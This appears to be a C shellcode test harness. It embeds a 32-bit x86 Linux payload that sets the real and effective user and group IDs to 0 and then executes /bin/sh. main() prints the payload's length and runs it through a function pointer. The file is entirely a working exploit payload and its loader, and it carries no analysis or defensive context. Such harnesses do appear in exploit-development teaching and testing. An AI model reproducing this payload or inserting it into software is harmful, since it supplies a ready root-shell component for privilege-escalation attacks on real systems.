#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] = \
"\x31\xc0\xb0\xcb\x31\xdb\x31\xc9\xcd\x80\x31\xc0\xb0\xcc\x31\xdb\x31\xc9\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\x31\xd2\xcd\x80";

int main(int argc, char **argv)
{
	printf("Shellcode Length: %d Bytes\n", strlen(shellcode));

	int (*ret)(); // ret is a function pointer
	ret = (int(*)())shellcode; // ret points to shellcode

	(int)(*ret)();	// execute as function shellcode[]
	//exit(0);
}
